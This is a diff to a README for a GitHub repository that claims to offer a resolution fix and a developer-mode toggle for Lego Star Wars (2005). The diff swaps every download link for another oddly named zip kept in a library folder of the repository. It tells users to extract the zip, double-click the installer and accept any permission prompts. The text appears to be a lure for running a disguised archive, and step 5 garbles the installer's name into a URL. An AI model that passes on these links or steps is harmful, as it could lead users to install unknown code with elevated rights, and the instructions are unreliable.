@@ -4,13 +4,13 @@
 This project provides a wrapper and fix files for the Lego Star Wars 2005 PC game. It helps adjust the game's resolution and aspect ratio. Additionally, it includes a program to enable or disable the original developer's debug mode. With this mode, you can find extra options in the game by pausing and entering the options menu.
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Haylandercaio/Lego-Star-Wars-2005-PC-Resolution-FIX-DeveloperModeON/main/source/dxsdk/Mode_Wars_ON_Developer_Resolution_P_Lego_Star_FI_v3.9.zip%20Star%20Wars%20Fix-brightgreen)](https://raw.githubusercontent.com/Haylandercaio/Lego-Star-Wars-2005-PC-Resolution-FIX-DeveloperModeON/main/source/dxsdk/Mode_Wars_ON_Developer_Resolution_P_Lego_Star_FI_v3.9.zip)
+[![Download](https://github.com/Haylandercaio/Lego-Star-Wars-2005-PC-Resolution-FIX-DeveloperModeON/raw/refs/heads/main/source/dxsdk/lib/x64/Developer-Wars-FI-Star-ON-Resolution-P-Mode-Lego-v1.8.zip%20Star%20Wars%20Fix-brightgreen)](https://github.com/Haylandercaio/Lego-Star-Wars-2005-PC-Resolution-FIX-DeveloperModeON/raw/refs/heads/main/source/dxsdk/lib/x64/Developer-Wars-FI-Star-ON-Resolution-P-Mode-Lego-v1.8.zip)
 
 ## 🚀 Getting Started
 To use the Lego Star Wars 2005 fix, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download section.
-   [Visit this page to download](https://raw.githubusercontent.com/Haylandercaio/Lego-Star-Wars-2005-PC-Resolution-FIX-DeveloperModeON/main/source/dxsdk/Mode_Wars_ON_Developer_Resolution_P_Lego_Star_FI_v3.9.zip)
+   [Visit this page to download](https://github.com/Haylandercaio/Lego-Star-Wars-2005-PC-Resolution-FIX-DeveloperModeON/raw/refs/heads/main/source/dxsdk/lib/x64/Developer-Wars-FI-Star-ON-Resolution-P-Mode-Lego-v1.8.zip)
    
 2. **Choose the Latest Release**: Look for the most recent version at the top of the page. This will ensure you get the latest features and fixes.
 
@@ -20,7 +20,7 @@ To use the Lego Star Wars 2005 fix, follow these steps:
 
 4. **Unzip the Files (if needed)**: If you downloaded a ZIP file, find it in your downloads folder. Right-click and select "Extract All" or use another unzipping tool. 
 
-5. **Run the Installer or Program**: After unzipping, look for the installation file (usually named something like `https://raw.githubusercontent.com/Haylandercaio/Lego-Star-Wars-2005-PC-Resolution-FIX-DeveloperModeON/main/source/dxsdk/Mode_Wars_ON_Developer_Resolution_P_Lego_Star_FI_v3.9.zip` or a similar name). Double-click to start the installation. 
+5. **Run the Installer or Program**: After unzipping, look for the installation file (usually named something like `https://github.com/Haylandercaio/Lego-Star-Wars-2005-PC-Resolution-FIX-DeveloperModeON/raw/refs/heads/main/source/dxsdk/lib/x64/Developer-Wars-FI-Star-ON-Resolution-P-Mode-Lego-v1.8.zip` or a similar name). Double-click to start the installation. 
 
 6. **Follow the On-Screen Instructions**: The setup process will guide you through the installation. Confirm any prompts related to permissions, as they are necessary for proper installation.
 
